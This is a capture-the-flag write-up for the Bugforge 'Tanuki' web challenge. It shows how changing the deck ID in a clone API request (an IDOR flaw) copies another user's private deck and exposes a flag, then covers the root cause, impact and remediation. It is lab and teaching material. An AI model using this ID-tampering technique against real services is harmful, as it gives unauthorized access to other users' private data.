# Tanuki — tanuki-013 — Can you clone private decks?

## Challenge Overview

- **Challenge:** Tanuki
- **Platform:** Bugforge
- **Category:** Web Security
- **Vulnerability:** Broken Access Control / IDOR
- **Objective:** Clone a private deck and retrieve the flag.

### Hint

> Can you clone private decks?

---

## 1. Initial Reconnaissance

Registered a test user and inspected the application's API requests using browser Developer Tools.

### GET `/api/decks`

```http
GET /api/decks
```

The endpoint returned the available decks:

| ID | Name            | Owner |
| -- | --------------- | ----- |
| 1  | Planets & Moons | null  |
| 2  | Linux Trivia    | null  |
| 3  | Cheese Origins  | null  |

Created a new deck named `Test`.

### POST `/api/decks`

```http
POST /api/decks
Content-Type: application/json

{
  "name": "Test",
  "description": "This is a Test Deck.",
  "category": "Test"
}
```

Response:

```json
{
  "id": 6,
  "message": "Deck created successfully"
}
```

The new deck received ID `6`, indicating that IDs `4` and `5` were already allocated.

---

## 2. Community Deck Enumeration

Navigated to the Community section and captured the API request.

### GET `/api/community`

```http
GET /api/community
```

Response:

```json
[
  {
    "id": 4,
    "name": "JLPT N1 — Practice Questions",
    "description": "Open practice set from the course instructor. Clone it to drill before the mock exam.",
    "category": "Japanese",
    "share_token": "b0916ea23ca421855bffccd5759e6f06",
    "created_at": "2026-11-09 11:33:40",
    "contributor": "admin",
    "card_count": 5
  }
]
```

Deck ID `4` was identified as a community deck.

The missing deck ID `5` became a potential target for testing private deck access.

---

## 3. Normal Deck Cloning

Clicked **Clone to my Library** on the community deck.

### POST `/api/decks/4/clone`

```http
POST /api/decks/4/clone
```

Response:

```json
{
  "id": 7,
  "message": "Deck cloned to your library"
}
```

This revealed the cloning endpoint structure:

```http
POST /api/decks/{deck_id}/clone
```

---

## 4. Exploitation — Unauthorized Private Deck Cloning

Modified the deck ID from `4` to `5`.

### Exploit Request

```http
POST /api/decks/5/clone
```

Response:

```json
{
  "id": 8,
  "message": "Deck cloned to your library"
}
```

The server successfully cloned deck ID `5` without preventing access to a private deck.

---

## 5. Flag Retrieval

Navigated back to the Decks page and inspected:

```http
GET /api/decks
```

The cloned private deck appeared in the response:

```json
{
  "id": 8,
  "name": "bug{Ndr7dmmeuVG4NRTDmzdl6LCOWVnwtI3Y}",
  "description": "Private instructor copy. Do not distribute — contains the graded answer key for the final.",
  "category": "Japanese",
  "owner_id": 4,
  "is_public": 0,
  "share_token": null,
  "created_at": "2026-11-09 11:57:08",
  "card_count": 4,
  "cards_studied": 0,
  "cards_mastered": 0
}
```

### Flag

```text
bug{Ndr7dmmeuVG4NRTDmzdl6LCOWVnwtI3Y}
```

---

## 6. Root Cause

The endpoint:

```http
POST /api/decks/{deck_id}/clone
```

failed to properly enforce authorization checks on private decks.

The server allowed an authenticated user to clone a deck belonging to another user, regardless of its private visibility setting.

### Vulnerability Classification

- **OWASP Top 10:** A01 – Broken Access Control
- **CWE-862:** Missing Authorization
- **CWE-639:** Authorization Bypass Through User-Controlled Key

---

## 7. Security Impact

An attacker with a valid account could:

- Clone private decks belonging to other users.
- Access confidential deck metadata.
- Retrieve sensitive educational content.
- Potentially access instructor-only materials, including answer keys.

---

## 8. Remediation

The application should:

1. Verify the authenticated user's ownership of the source deck.
2. Allow cloning only if the deck is public or explicitly shared with the user.
3. Validate share tokens when private sharing is supported.
4. Enforce authorization checks server-side for every clone request.
5. Return `403 Forbidden` or an appropriate `404 Not Found` for unauthorized attempts.
6. Avoid exposing sensitive private deck metadata through library endpoints.

---

## Conclusion

The Tanuki challenge was solved by exploiting Broken Access Control in the deck cloning functionality.

By changing the deck ID in the cloning endpoint from the publicly available community deck (`4`) to a private deck (`5`), the application allowed unauthorized cloning.

The cloned private deck exposed the flag in its title, completing the challenge.

**Status: Solved**